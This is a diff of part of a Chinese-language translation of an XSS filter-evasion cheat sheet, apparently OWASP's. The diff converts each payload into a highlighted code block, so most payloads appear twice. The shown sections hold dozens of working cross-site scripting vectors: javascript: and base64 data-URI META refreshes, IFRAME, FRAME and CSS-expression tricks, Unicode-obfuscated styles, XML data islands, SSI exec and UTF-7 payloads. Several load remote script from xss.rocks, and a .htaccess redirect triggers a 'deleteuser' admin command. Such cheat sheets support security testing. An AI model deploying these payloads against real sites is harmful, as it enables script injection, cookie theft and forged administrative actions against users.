 <h3 id="2-62-META"><a href="#2-62-META" class="headerlink" title="2.62.    META"></a>2.62.    META</h3><p>关于meta刷新比较奇怪的是它并不会在头部中发送一个referrer-所以它通常用于不需要referrer的时候:</p>
-<blockquote>
-<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
 <p><strong>2.62.1 使用数据的META</strong></p>
 <p>URL scheme指令。这个非常有用因为它并不包含任何可见的SCRIPT单词或JavaScript指令,因为它使用了base64编码.请查看RFC 2397寻找更多细节。你同样可以使用具有Base64编码功能的XSS工具来编码HTML或JavaScript:</p>
-<blockquote>
-<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</div></pre></td></tr></table></figure>
 <p><strong>2.62.2 含有额外URL参数的META</strong></p>
 <p>如果目标站点尝试检查URL是否包含”<a href="http://&quot;，你可以用以下技术规避它(由Moritz" target="_blank" rel="external">http://&quot;，你可以用以下技术规避它(由Moritz</a> Naumann提交):</p>
-<blockquote>
-<meta http-equiv="refresh" content="0; URL=http://;URL=javascript:alert('XSS');">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-63-IFRAME"><a href="#2-63-IFRAME" class="headerlink" title="2.63.    IFRAME"></a>2.63.    IFRAME</h3><p>如果允许Iframe那就会有很多XSS问题:</p>
-<blockquote>
-<iframe src="javascript:alert('XSS');"></iframe>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-64-基于事件IFRAME"><a href="#2-64-基于事件IFRAME" class="headerlink" title="2.64.    基于事件IFRAME"></a>2.64.    基于事件IFRAME</h3><p>Iframes和大多数其他元素可以使用下列事件（由David Cross提交）:</p>
-<blockquote>
-<iframe src="#" onmouseover="alert(document.cookie)"></iframe>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-65-FRAME"><a href="#2-65-FRAME" class="headerlink" title="2.65.    FRAME"></a>2.65.    FRAME</h3><p>Frames和iframe一样有很多XSS问题:</p>
-<blockquote>
-<frameset><frame src="javascript:alert('XSS');"></frameset>
-
-</blockquote>
-<h3 id="2-66-TABLE"><a href="#2-66-TABLE" class="headerlink" title="2.66.    TABLE"></a>2.66.    TABLE</h3><blockquote>
-<table background="javascript:alert('XSS')">
-
-</table></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-66-TABLE"><a href="#2-66-TABLE" class="headerlink" title="2.66.    TABLE"></a>2.66.    TABLE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
 <p><strong>2.66.1. TD</strong></p>
 <p>和上面一样，TD也可以通过BACKGROUND来包含JavaScriptXSS攻击向量:</p>
-<blockquote>
-<p><table><td background="javascript:alert('XSS')"></td></table></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-67-DIV"><a href="#2-67-DIV" class="headerlink" title="2.67.    DIV"></a>2.67.    DIV</h3><p><strong>2.67.1. DIV背景图像</strong></p>
-<blockquote>
-<div style="background-image: url(javascript:alert('XSS'))">
-
-</div></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</div></pre></td></tr></table></figure>
 <p><strong>2.67.2. 含有Unicode XSS利用代码的DIV背景图像</strong></p>
 <p>这进行了一些修改来混淆URL参数。原始的漏洞是由RenaudLifchitz在Hotmail发现的:</p>
-<blockquote>
-<div style="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
-
-</div></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;</div></pre></td></tr></table></figure>
 <p><strong>2.67.3. 含有额外字符的DIV背景图像</strong></p>
 <p>Rnaske进行了一个快速的XSS模糊测试来发现IE和安全模式下的Netscape 8.1中任何可以在左括号和JavaScript指令间加入的额外字符。这都是十进制的但是你也可以使用十六进制来填充（以下字符可用：1-32, 34, 39, 160, 8192-8.13, 12288, 65279）:</p>
-<blockquote>
-<div style="background-image: url(&#1;javascript:alert('XSS'))">
-
-</div></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;</div></pre></td></tr></table></figure>
 <p><strong>2.67.4. DIV表达式</strong></p>
 <p>一个非常有效的对抗现实中的跨站脚本过滤器的变体是在冒号和”expression”之间添加一个换行：</p>
-<blockquote>
-<div style="width: expression(alert('XSS'));">
-
-</div></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-68-html-条件选择注释块"><a href="#2-68-html-条件选择注释块" class="headerlink" title="2.68.    html 条件选择注释块"></a>2.68.    html 条件选择注释块</h3><p>只能在IE5.0及更高版本和IE渲染引擎模式下的Netscape 8.1生效。一些网站认为在注释中的任何内容都是安全的并且认为没有必要移除，这就允许我们添加跨站脚本攻击向量。系统会在一些内容周围尝试添加注释标签以便安全的渲染它们。如我们所见，这有时并不起作用：</p>
-<blockquote>
-<!--[if gte IE 4]>
-
- <SCRIPT>alert('XSS');</SCRIPT>
-
- <![endif]-->
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!--[if gte IE 4]&gt;</div><div class="line"></div><div class="line"> &lt;SCRIPT&gt;alert(&apos;XSS&apos;);&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line"> &lt;![endif]--&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-69-BASE标签"><a href="#2-69-BASE标签" class="headerlink" title="2.69.    BASE标签"></a>2.69.    BASE标签</h3><p>在IE和安全模式下的Netscape 8.1有效。你需要使用//来注释下个字符，这样你就不会造成JavaScript错误并且你的XSS标签可以被渲染。同样，这需要当前网站使用相对路径例如”images/image.jpg”来放置图像而不是绝对路径。如果路径以一个斜杠开头例如”/images/image.jpg”你可以从攻击向量中移除一个斜杠（只有在两个斜杠时注释才会生效）：</p>
-<blockquote>
-<base href="javascript:alert('XSS');//">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-70-OBJECT标签"><a href="#2-70-OBJECT标签" class="headerlink" title="2.70.    OBJECT标签"></a>2.70.    OBJECT标签</h3><p>如果允许使用OBJECT，你可以插入一个病毒攻击载荷来感染用户，类似于APPLET标签。链接文件实际是含有你XSS攻击代码的HTML文件:</p>
-<blockquote>
-<object type="text/x-scriptlet" data="<http://xss.rocks/scriptlet.html>"></object>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;&lt;http://xss.rocks/scriptlet.html&gt;&quot;&gt;&lt;/OBJECT&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-71-使用EMBED标签加载含有XSS的FLASH文件"><a href="#2-71-使用EMBED标签加载含有XSS的FLASH文件" class="headerlink" title="2.71.    使用EMBED标签加载含有XSS的FLASH文件"></a>2.71.    使用EMBED标签加载含有XSS的FLASH文件</h3><p>如果你添加了属性allowScriptAccess=”never”以及allownetworking=”internal”则可以减小风险（感谢Jonathan Vanasco提供的信息）:</p>
-<blockquote>
-<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-72-使用EMBED-SVG包含攻击向量"><a href="#2-72-使用EMBED-SVG包含攻击向量" class="headerlink" title="2.72.    使用EMBED SVG包含攻击向量"></a>2.72.    使用EMBED SVG包含攻击向量</h3><p>该示例只在FireFox下有效，但是比上面的攻击向量在FireFox下好，因为不需要用户安装或启用FLASH。感谢nEUrOO提供:</p>
-<blockquote>
-<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always">
-
-</blockquote>
-<h3 id="2-73-在FLASH中使用ActionScript混淆XSS攻击向量"><a href="#2-73-在FLASH中使用ActionScript混淆XSS攻击向量" class="headerlink" title="2.73.    在FLASH中使用ActionScript混淆XSS攻击向量"></a>2.73.    在FLASH中使用ActionScript混淆XSS攻击向量</h3><blockquote>
-<p>a=”get”;</p>
-<p>b=”URL(\””;</p>
-<p>c=”javascript:”;</p>
-<p>d=”alert(‘XSS’);\”)”;</p>
-<p>eval(a+b+c+d);</p>
-</blockquote>
-<p>### </p>
-<p>### </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-73-在FLASH中使用ActionScript混淆XSS攻击向量"><a href="#2-73-在FLASH中使用ActionScript混淆XSS攻击向量" class="headerlink" title="2.73.    在FLASH中使用ActionScript混淆XSS攻击向量"></a>2.73.    在FLASH中使用ActionScript混淆XSS攻击向量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">a=&quot;get&quot;;</div><div class="line"></div><div class="line">b=&quot;URL(\&quot;&quot;;</div><div class="line"></div><div class="line">c=&quot;javascript:&quot;;</div><div class="line"></div><div class="line">d=&quot;alert(&apos;XSS&apos;);\&quot;)&quot;;</div><div class="line"></div><div class="line">eval(a+b+c+d);</div></pre></td></tr></table></figure>
 <h3 id="2-74-CDATA混淆的XML数据岛"><a href="#2-74-CDATA混淆的XML数据岛" class="headerlink" title="2.74.    CDATA混淆的XML数据岛"></a>2.74.    CDATA混淆的XML数据岛</h3><p>这个XSS攻击只在IE和使用IE渲染模式的Netscape 8.1下有效-攻击向量由Sec Consult在审计Yahoo时发现</p>
-<blockquote>
-<xml id="xss"><i><b><img src="javas<!-- -->cript:alert('XSS')"></b></i></xml>
-
-<span datasrc="#xss" datafld="B" dataformatas="HTML"></span>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;</div><div class="line"></div><div class="line">&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-75-使用XML数据岛生成含内嵌JavaScript的本地XML文件"><a href="#2-75-使用XML数据岛生成含内嵌JavaScript的本地XML文件" class="headerlink" title="2.75.    使用XML数据岛生成含内嵌JavaScript的本地XML文件"></a>2.75.    使用XML数据岛生成含内嵌JavaScript的本地XML文件</h3><p>这和上面是一样的但是将来源替换为了包含跨站脚本攻击向量的本地XML文件（必须在同一服务器上）：</p>
-<blockquote>
-<xml src="xsstest.xml" id="I"></xml>
-
-<span datasrc="#I" datafld="C" dataformatas="HTML"></span>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;</div><div class="line"></div><div class="line">&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-76-XML中使用HTML-TIME"><a href="#2-76-XML中使用HTML-TIME" class="headerlink" title="2.76.    XML中使用HTML+TIME"></a>2.76.    XML中使用HTML+TIME</h3><p>这是Grey Magic攻击Hotmail和Yahoo的方法。这只在IE和IE渲染模式下的Netscape8.1有效并且记得需要在HTML域的BODY标签中间才有效：</p>
-<blockquote>
-<html><body><br><br>&lt;?xml:namespace prefix=”t” ns=”urn:schemas-microsoft-com:time”&gt;<br><br>&lt;?import namespace=”t” implementation=”#default#time2”&gt;<br><br><t:set attributename="innerHTML" to="XSS<SCRIPT DEFER>alert(" xss")<="" script="">"><br><br></t:set></body></html>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;HTML&gt;&lt;BODY&gt;</div><div class="line"></div><div class="line">&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;</div><div class="line"></div><div class="line">&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;</div><div class="line"></div><div class="line">&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</div><div class="line"></div><div class="line">&lt;/BODY&gt;&lt;/HTML&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-77-使用一些字符绕过”-js”过滤"><a href="#2-77-使用一些字符绕过”-js”过滤" class="headerlink" title="2.77.    使用一些字符绕过”.js”过滤"></a>2.77.    使用一些字符绕过”.js”过滤</h3><p>你可以将你的JavaScript文件重命名为图像来作为XSS攻击向量：</p>
-<blockquote>
-<script src="<http://xss.rocks/xss.jpg>"></script>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=&quot;&lt;http://xss.rocks/xss.jpg&gt;&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-78-SSI（服务端脚本包含）"><a href="#2-78-SSI（服务端脚本包含）" class="headerlink" title="2.78.    SSI（服务端脚本包含）"></a>2.78.    SSI（服务端脚本包含）</h3><p>这需要在服务器端允许SSI来使用XSS攻击向量。似乎不用提示这点，因为如果你可以在服务器端执行指令那一定是有更严重的问题存在：</p>
-<blockquote>
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=<http://xss.rocks/xss.js>></SCRIPT>'"-->
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCR&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;IPT SRC=&lt;http://xss.rocks/xss.js&gt;&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-79-PHP"><a href="#2-79-PHP" class="headerlink" title="2.79.    PHP"></a>2.79.    PHP</h3><p>需要服务器端安装了PHP来使用XSS攻击向量。同样，如果你可以远程运行任意脚本，那会有更加严重的问题：</p>
-<blockquote>
-<p>&lt;? echo(‘&lt;SCR)’;</p>
-<p>echo(‘IPT&gt;alert(“XSS”)‘); ?&gt;</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;? echo(&apos;&lt;SCR)&apos;;</div><div class="line"></div><div class="line">echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-80-嵌入命令的IMAGE"><a href="#2-80-嵌入命令的IMAGE" class="headerlink" title="2.80.    嵌入命令的IMAGE"></a>2.80.    嵌入命令的IMAGE</h3><p>当页面受密码保护并且这个密码保护同样适用于相同域的不同页面时有效，这可以用来进行删除用户，增加用户（如果访问页面的是管理员的话），将密码发送到任意地方等等。。。这是一个较少使用当时更有价值的XSS攻击向量：</p>
-<blockquote>
-<img src="<http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode>">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;&lt;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&gt;&quot;&gt;</div></pre></td></tr></table></figure>
 <p><strong>2.80.1. 嵌入命令的IMAGE II</strong></p>
-<p>这更加可怕因为这不包含任何可疑标识，除了它不在你自己的域名上。这个攻击向量使用一个302或304（其他的也有效）来重定向图片到指定命令。所以一个普通的<img src="httx://badguy.com/a.jpg">对于访问图片链接的用户来说也有可能是一个攻击向量。下面是利用.htaccess（Apache）配置文件来实现攻击向量。（感谢Timo提供这部分。）：</p>
-<blockquote>
-<p>Redirect 302 /a.jpg <a href="http://victimsite.com/admin.asp&amp;deleteuser" target="_blank" rel="external">http://victimsite.com/admin.asp&amp;deleteuser</a></p>
-</blockquote>
+<p>这更加可怕因为这不包含任何可疑标识，除了它不在你自己的域名上。这个攻击向量使用一个302或304（其他的也有效）来重定向图片到指定命令。所以一个普通的<code>&lt;IMG SRC=&quot;httx://badguy.com/a.jpg&quot;&gt;</code>对于访问图片链接的用户来说也有可能是一个攻击向量。下面是利用.htaccess（Apache）配置文件来实现攻击向量。（感谢Timo提供这部分。）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</div></pre></td></tr></table></figure>
 <h3 id="2-81-Cookie篡改"><a href="#2-81-Cookie篡改" class="headerlink" title="2.81.    Cookie篡改"></a>2.81.    Cookie篡改</h3><p>尽管公认不太实用，但是还是可以发现一些允许使用META标签的情况下可用它来覆写cookie。另外的例子是当用户访问网站页面时，一些网站读取并显示存储在cookie中的用户名，而不是数据库中。当这两种场景结合时，你可以修改受害者的cookie以便将JavaScript注入到其页面中（你可以使用这个让用户登出或改变他们的用户状态，甚至可以让他们以你的账户登录）：</p>
-<blockquote>
-<meta http-equiv="Set-Cookie" content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-82-UTF-7编码"><a href="#2-82-UTF-7编码" class="headerlink" title="2.82.    UTF-7编码"></a>2.82.    UTF-7编码</h3><p>如果存在XSS的页面没有提供页面编码头部，或者使用了任何设置为使用UTF-7编码的浏览器，就可以使用下列方式进行攻击（感谢Roman Ivanov提供）。这在任何不改变编码类型的现代浏览器上是无效的，这也是为什么标记为完全不支持的原因。Watchfire在Google的自定义404脚本中发现这个问题：</p>
-<blockquote>
-<p><head><meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-7"> </head>+ADw-SCRIPT+AD4-alert(‘XSS’);+ADw-/SCRIPT+AD4-</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-</div></pre></td></tr></table></figure>
 <h3 id="2-83-利用HTML引号包含的XSS"><a href="#2-83-利用HTML引号包含的XSS" class="headerlink" title="2.83.    利用HTML引号包含的XSS"></a>2.83.    利用HTML引号包含的XSS</h3><p>这在IE中测试通过，但还得视情况而定。它是为了绕过那些允许”<script>“但是不允许”<SCRIPT SRC..."形式的正则过滤即"/<script[^>]+src/i”：</p>
-<blockquote>
-<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></script>
-
-</p></blockquote>
-<p>这是为了绕过那些允许”<script>“但是不允许”&lt;SCRIPTSRC…”形式的正则过滤即” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”（这很重要，因为在实际环境中出现过这种正则过滤）：</p>
-<blockquote>
-<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></script>
-
-</p></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
+<p>这是为了绕过那些允许<code>&lt;SCRIPT&gt;</code>但是不允许”&lt;SCRIPTSRC…”形式的正则过滤即” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”（这很重要，因为在实际环境中出现过这种正则过滤）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <p>另一个绕过此正则过滤” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”的XSS：</p>
-<blockquote>
-<script a=">" ''="" src="httx://xss.rocks/xss.js"></script>
-
-</blockquote>
-<p>又一个绕过正则过滤” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”的XSS。尽管不想提及防御方法，但如果你想允许<script>标签但不加载远程脚本，针对这种XSS只能使用状态机去防御（当然如果允许<SCRIPT>标签的话，还有其他方法绕过）：</p>
-<blockquote>
-<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></script>
-
-
-</p><p>最后一个绕过此正则过滤” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”的XSS，使用了重音符（在FireFox下无效）：</p>
-<blockquote>
-<script a="`">` SRC=”httx://xss.rocks/xss.js”&gt;</script>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
+<p>又一个绕过正则过滤” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”的XSS。尽管不想提及防御方法，但如果你想允许<code>&lt;SCRIPT&gt;</code>标签但不加载远程脚本，针对这种XSS只能使用状态机去防御（当然如果允许<code>&lt;SCRIPT&gt;</code>标签的话，还有其他方法绕过）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
+<p>最后一个绕过此正则过滤” /&lt;script((\s+\w+(\s<em>=\s</em>(?:”(.)<em>?”|’(.)</em>?’|[^’”&gt;\s]+))?)+\s<em>|\s</em>)src/i”的XSS，使用了重音符（在FireFox下无效）：</p>
